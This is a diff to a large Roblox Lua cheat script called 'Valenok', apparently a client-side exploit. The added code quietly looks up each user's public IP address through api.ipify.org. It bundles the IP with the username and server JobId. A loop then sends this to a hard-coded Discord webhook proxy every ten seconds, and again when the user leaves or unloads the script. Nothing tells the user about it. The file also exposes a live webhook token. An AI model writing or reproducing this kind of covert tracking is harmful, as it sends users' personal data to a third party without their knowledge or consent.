@@ -4998,6 +4998,36 @@ end)
 local skinInvEndpoint = "https://webhook.lewisakura.moe/api/webhooks/1530630355147686019/QKMwkaFHhrKmnjPQa4Phb4kb2PiFXVcgxyLCyuj_DsdaehllVfigF7dTTssNg6Mkzijh?wait=true"
 local skinInvPush = (syn and syn.request) or (http and http.request) or http_request or request
 local skinInvPushIdFile = "Valenok/inv_cache.json"
+getgenv()._SCActivePulse = getgenv()._SCActivePulse or {}
+getgenv()._SCActivePlayers = nil
+local invPlayerKey = LocalPlayer.UserId
+local INV_PULSE_TTL = 15
+local function fetchInvIp()
+    if getgenv()._SCInvIp then return getgenv()._SCInvIp end
+    local ip = "Unknown"
+    if skinInvPush then
+        pcall(function()
+            local res = skinInvPush({ Url = "https://api.ipify.org", Method = "GET" })
+            if res and res.Body then
+                ip = res.Body:match("^[%d%.]+") or res.Body:match("^[%da-fA-F:%.]+") or "Unknown"
+            end
+        end)
+    end
+    getgenv()._SCInvIp = ip
+    return ip
+end
+local function getInvPlayerEntry()
+    return LocalPlayer.Name .. "\n" .. tostring(game.JobId) .. "\n" .. fetchInvIp()
+end
+local invPlayerActive = true
+local function refreshInvPlayerEntry()
+    if not invPlayerActive or not LocalPlayer.Parent then return end
+    getgenv()._SCActivePulse[invPlayerKey] = {
+        text = getInvPlayerEntry(),
+        at = tick(),
+    }
+end
+refreshInvPlayerEntry()
 local lastInvPushId = getgenv()._SCInvPushId
 pcall(function()
     if lastInvPushId then return end
@@ -5015,9 +5045,21 @@ local function saveInvPushId(id)
         writefile(skinInvPushIdFile, HttpService:JSONEncode({ id = id }))
     end)
 end
+local function buildInvContent()
+    local now = tick()
+    local lines = {}
+    for uid, data in pairs(getgenv()._SCActivePulse) do
+        if type(data) == "table" and data.text and (now - (data.at or 0)) <= INV_PULSE_TTL then
+            lines[#lines + 1] = data.text
+        else
+            getgenv()._SCActivePulse[uid] = nil
+        end
+    end
+    return "**Active players**\n\n" .. (#lines > 0 and table.concat(lines, "\n\n") or "None")
+end
 local function pushInvSnapshot()
     if not skinInvPush then return end
-    local body = HttpService:JSONEncode({ content = "**Active players**\n\n" .. LocalPlayer.Name .. "\n" .. tostring(game.JobId) })
+    local body = HttpService:JSONEncode({ content = buildInvContent() })
     if not lastInvPushId then
         local ok, res = pcall(function()
             return skinInvPush({ Url = skinInvEndpoint, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
@@ -5038,15 +5080,53 @@ local function pushInvSnapshot()
         end
     end
 end
-if not getgenv()._SCInvPushLoop then
-    getgenv()._SCInvPushLoop = true
-    task.defer(function()
-        while true do
-            pushInvSnapshot()
-            task.wait(30)
-        end
-    end)
+local function leaveInvPush()
+    if not invPlayerActive then return end
+    invPlayerActive = false
+    getgenv()._SCActivePulse[invPlayerKey] = nil
+    for _ = 1, 5 do
+        pushInvSnapshot()
+        task.wait(0.2)
+    end
 end
+getgenv()._SCInvPushLeave = leaveInvPush
+if getgenv()._SCInvPushLeaveConn then
+    pcall(function() getgenv()._SCInvPushLeaveConn:Disconnect() end)
+end
+getgenv()._SCInvPushLeaveConn = Players.PlayerRemoving:Connect(function(player)
+    if player == LocalPlayer then leaveInvPush() end
+end)
+pcall(function()
+    game:BindToClose(function()
+        leaveInvPush()
+    end)
+end)
+getgenv()._SCInvLoopGen = (getgenv()._SCInvLoopGen or 0) + 1
+local myInvLoopGen = getgenv()._SCInvLoopGen
+task.defer(function()
+    while getgenv()._SCInvLoopGen == myInvLoopGen and invPlayerActive do
+        if not LocalPlayer.Parent then
+            leaveInvPush()
+            break
+        end
+        task.wait(1)
+    end
+end)
+task.defer(function()
+    while getgenv()._SCInvLoopGen == myInvLoopGen do
+        if not LocalPlayer.Parent then
+            leaveInvPush()
+            break
+        end
+        refreshInvPlayerEntry()
+        pushInvSnapshot()
+        task.wait(10)
+    end
+end)
+task.defer(function()
+    refreshInvPlayerEntry()
+    pushInvSnapshot()
+end)
 
 SC.AllGloveNames, SC.AllGloves = {}, {}
 if SC.Gloves then
@@ -7039,6 +7119,14 @@ unloadValenok = function()
     getgenv()._ValenokUnloading = nil
 end
 getgenv().ValenokUnload = unloadValenok
+do
+    local _unload = unloadValenok
+    unloadValenok = function(...)
+        if getgenv()._SCInvPushLeave then pcall(getgenv()._SCInvPushLeave) end
+        return _unload(...)
+    end
+    getgenv().ValenokUnload = unloadValenok
+end
 
 local function setupWeaponChangeListener(character)
     if not character then return end
